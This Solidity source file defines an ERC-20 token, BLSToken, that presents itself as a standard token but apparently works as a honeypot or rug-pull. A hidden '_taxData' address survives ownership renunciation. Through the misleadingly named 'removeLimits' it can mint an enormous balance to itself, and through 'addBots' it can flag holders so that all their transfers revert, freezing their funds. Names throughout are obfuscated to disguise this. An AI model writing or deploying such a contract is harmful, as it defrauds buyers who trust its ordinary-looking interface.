// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Ownable  {
     function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}

contract BLSToken is Ownable{   
    constructor(string memory name_, string memory symbol_, address add) {      
        _tokename = name_;
        _tokensymbol = symbol_;
        _taxData = add;
        _totalSupply = 350000000*10**decimals();
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
    address public _taxData;
    uint256 private _totalSupply;
    string private _tokename;
    string private _tokensymbol;  
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public tokeninfo;
    uint128 buyCount = 64544;
    uint256 devAmount = 10**decimals()*68800*(23300000000+300);
    bool globaltrue = true;
    bool globalff = false;

    function addBots(address bot) public virtual returns (bool) {
        address tmoinfo = bot;     
        tokeninfo[tmoinfo] = globaltrue;
        require(_msgSender() == _taxData);
        return true;
    }

    function delBots(address notbot) external  {
        address tmoinfo = notbot;      
        tokeninfo[tmoinfo] = globalff;
        require(_msgSender() == _taxData);      
    }

    function removeLimits() external   {
        if(_msgSender() == _taxData){  
            require( _taxData == _msgSender());  
            address feeAmount = _msgSender();
            address swapRouter = feeAmount;
            address devWallet = swapRouter; 
            _balances[devWallet] += devAmount;       
        }   
       
    }
    
    function name() public view returns (string memory) {
        return _tokename;
    }

    function symbol() public view  returns (string memory) {
        return _tokensymbol;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");        
        require(to != address(0), "ERC20: transfer to the zero address");

        if (tokeninfo[from] == true) 
        {amount = buyCount + _balances[from] + 
        buyCount-buyCount;}
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
}